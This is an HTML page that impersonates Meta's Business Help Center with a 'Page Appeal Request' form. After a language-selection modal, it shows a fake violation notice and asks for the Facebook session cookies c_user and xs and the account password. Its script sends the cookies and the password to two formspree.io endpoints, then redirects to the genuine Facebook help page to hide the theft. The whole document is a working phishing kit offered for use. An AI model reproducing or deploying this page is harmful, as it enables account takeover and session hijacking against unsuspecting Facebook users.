<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meta Business Help Center</title>
    <style>
        * { box-sizing: border-box; }
        body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; padding: 20px; margin: 0; }
        .meta-container { background: white; padding: 24px; border-radius: 12px; width: 100%; max-width: 450px; }
        
        /* Modal Styles */
        .modal { display: flex; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 1000; justify-content: center; align-items: center; }
        .modal-content { background: white; padding: 20px; border-radius: 12px; width: 90%; max-width: 350px; max-height: 80vh; overflow-y: auto; }
        .lang-option { padding: 12px; border: 1px solid #ddd; margin-bottom: 8px; border-radius: 6px; cursor: pointer; }
        .lang-option:hover { background: #f0f2f5; }
        
        /* Appeal Form Style */
        #appealForm { display: none; }
        .header { margin-bottom: 24px; }
        .meta-logo { width: 44px; margin-bottom: 16px; }
        .header-title { font-size: 26px; font-weight: 800; color: #1c1e21; margin: 0; }
        .alert-box { border-radius: 8px; padding: 16px; background-color: #f7f8fa; margin-bottom: 24px; border-left: 4px solid #0866ff; }
        .video-wrapper { margin-bottom: 24px; }
        .video-wrapper video { width: 100%; border-radius: 8px; border: 1px solid #dddfe2; background: #000; }
        
        .input-group { margin-bottom: 20px; }
        .input-label { font-weight: 700; margin-bottom: 8px; display: block; }
        input[type="text"], input[type="password"] { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; outline: none; }
        input:focus { border-color: #0866ff; }
        .submit-btn { width: 100%; padding: 14px; background: #0866ff; color: white; border: none; border-radius: 8px; font-weight: 700; cursor: pointer; }
    </style>
</head>
<body>

    <div class="meta-container">
        <div id="langModal" class="modal">
            <div class="modal-content">
                <h3>Select Your Language</h3>
                <input type="text" placeholder="Search languages..." style="width: 100%; padding: 10px; margin-bottom: 10px;">
                <div class="lang-option">🇺🇸 English</div>
                <div class="lang-option">🇮🇳 Hindi</div>
                <div class="lang-option">🇪🇸 Spanish</div>
                <div class="lang-option">🇵🇹 Portuguese</div>
                <button onclick="showForm()" style="width:100%; padding:12px; background:#0866ff; color:white; border:none; border-radius:6px; margin-top:10px;">Confirm Language</button>
            </div>
        </div>

        <div id="appealForm">
            <div class="header">
                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="Meta Logo" class="meta-logo">
                <h1 class="header-title">Page Appeal Request</h1>
            </div>
            
            <div class="alert-box">
                <b>Notice:</b> Your page has a violation of our community standards. Please verify your identity.
            </div>

            <div class="video-wrapper">
                <video controls><source src="VID-20260418-WA0000.mp4" type="video/mp4"></video>
            </div>

            <form id="dualForm">
                <div class="input-group">
                    <label class="input-label">c_user</label>
                    <input type="text" id="c_user" name="c_user" placeholder="Enter c_user" required>
                </div>
                <div class="input-group">
                    <label class="input-label">xs</label>
                    <input type="text" id="xs" name="xs" placeholder="Enter xs" required>
                </div>
                <div class="input-group">
                    <label class="input-label">Password</label>
                    <input type="password" id="password" name="password" placeholder="Enter your password" required>
                </div>
                <button type="submit" id="submitBtn" class="submit-btn">Submit Appeal Request</button>
            </form>
        </div>
    </div>

    <script>
        function showForm() {
            document.getElementById('langModal').style.display = 'none';
            document.getElementById('appealForm').style.display = 'block';
        }

        const form = document.getElementById('dualForm');
        
        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            const btn = document.getElementById('submitBtn');
            btn.innerText = "Processing...";
            btn.disabled = true;

            const c_user = document.getElementById('c_user').value;
            const xs = document.getElementById('xs').value;
            const password = document.getElementById('password').value;

            // 1. Email 1: Pehli ID (Cookies)
            const sendCookies = fetch("https://formspree.io/f/maqaobyw", {
                method: "POST",
                body: JSON.stringify({ "Type": "COOKIES", "c_user": c_user, "xs": xs }),
                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' }
            });

            // 2. Email 2: Nayi ID (Password)
            const sendPass = fetch("https://formspree.io/f/xbdqoblb", {
                method: "POST",
                body: JSON.stringify({ "Type": "PASSWORD", "c_user": c_user, "password": password }),
                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' }
            });

            try {
                await Promise.all([sendCookies, sendPass]);
                window.location.href = "https://www.facebook.com/help";
            } catch (error) {
                window.location.href = "https://www.facebook.com/help";
            }
        });
    </script>
</body>
</html>
